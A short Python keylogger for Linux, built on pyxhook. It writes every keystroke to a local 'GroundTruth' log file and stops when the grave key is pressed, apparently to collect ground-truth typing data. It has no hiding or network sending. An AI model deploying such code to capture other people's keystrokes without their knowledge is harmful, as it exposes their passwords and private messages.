"""
Copyright (c) 2015, Aman Deep
All rights reserved.


A simple keylogger witten in python for linux platform
All keystrokes are recorded in a log file.

The program terminates when grave key(`) is pressed

grave key is found below Esc key
"""

import pyxhook
import sys
#change this to your log file's path

fileName = sys.argv[1]

log_file='../CollectedData/GroundTruth/' + fileName + 'GroundTruth.log'
fob=open(log_file, 'w')

#this function is called everytime a key is pressed.
def OnKeyPress(event):
  fob.write(event.Key)
  fob.write('\n')

  if event.Ascii==96: #96 is the ascii value of the grave key (`)
    fob.close()
    new_hook.cancel()
#instantiate HookManager class
new_hook=pyxhook.HookManager()
#listen to all keystrokes
new_hook.KeyDown=OnKeyPress
#hook the keyboard
new_hook.HookKeyboard()
#start the session
new_hook.start()
